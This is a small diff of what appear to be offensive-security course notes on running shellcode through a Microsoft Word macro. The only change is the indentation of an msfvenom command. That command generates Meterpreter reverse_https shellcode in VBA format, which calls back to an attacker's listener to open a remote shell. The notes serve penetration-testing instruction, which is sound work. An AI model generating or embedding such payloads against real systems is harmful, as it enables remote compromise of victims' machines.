@@ -12,7 +12,7 @@ Allocating memory through other Win32 APIs returns non-executable memory due to 
 
 In order to generate the shellcode, we need to know the target architecture. Obviously we are targeting a 64-bit Windows machine, but Microsoft Word 2016 installs as 32-bit by default, so we will generate 32-bit shellcode.
 
-  msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication 
+    msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication 
   
   (Since we will be executing our shellcode inside the Word application, we specify the EXITFUNC with a value of "thread" instead of the default value of "process" to avoid closing Microsoft Word when the shellcode exits.)
 
